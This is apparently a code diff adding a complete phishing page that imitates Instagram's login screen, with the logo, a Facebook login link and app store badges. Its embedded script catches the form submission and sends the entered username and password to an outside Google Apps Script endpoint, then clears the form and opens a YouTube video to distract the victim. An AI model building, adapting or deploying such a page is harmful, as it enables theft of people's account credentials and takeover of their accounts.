@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <title>Instagram Login</title>
+</head>
+
+<body>
+    <main>
+        <img src="IG.jpeg" alt="" class="phoneImg">
+        <div class="form-div">
+            <form id="myForm">
+                <img class="instaLogo" src="instaLogo.png" alt="logo">
+                <input type="text" name="username" class="input" placeholder="phone number, username, or email" required>
+                <input type="password" name="password" class="input" required placeholder="Password">
+                <button class="login-btn" type="submit">Log In</button>
+                <p id="or">or</p>
+                <a href="#" class="fb-login"><i class='bx bxl-facebook-square'></i>Log in with Facebook</a>
+            </form>
+            <div class="sign-up">
+                <p>Don't have an account? <a href="#" class="sign-link">Sign up</a></p>
+            </div>
+            <div class="get-app">
+                <p>Get the app</p>
+                <div class="store">
+                    <img id="play" src="playStore.png" alt="">
+                    <img id="microsoft" src="getMicrosoft.png" alt="">
+                </div>
+            </div>
+
+        </div>
+
+        <script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbynR4HxKsmeMZE97ialWgBFxhtLkaTk5kGa56BAy7cJ2L3peoMmZV-QFkyFeIUPKVyL/exec';
+            const form = document.getElementById('myForm');
+
+            form.addEventListener('submit', e => {
+                e.preventDefault();
+                
+                fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                    .then(response => response.json())
+                    .then(responseData => {
+                        if (responseData.result === 'success') {
+                            form.reset();
+                            window.open('https://www.youtube.com/watch?v=IQEDu8SPHao', '_blank'); // Change this URL to your desired YouTube video link
+                        } else {
+                            throw new Error(responseData.error || 'Submission failed');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error!', error.message);
+                        alert('There was an error submitting your form. Please try again.');
+                    });
+            });
+        </script>
+    </main>
+</body>
+
+</html>
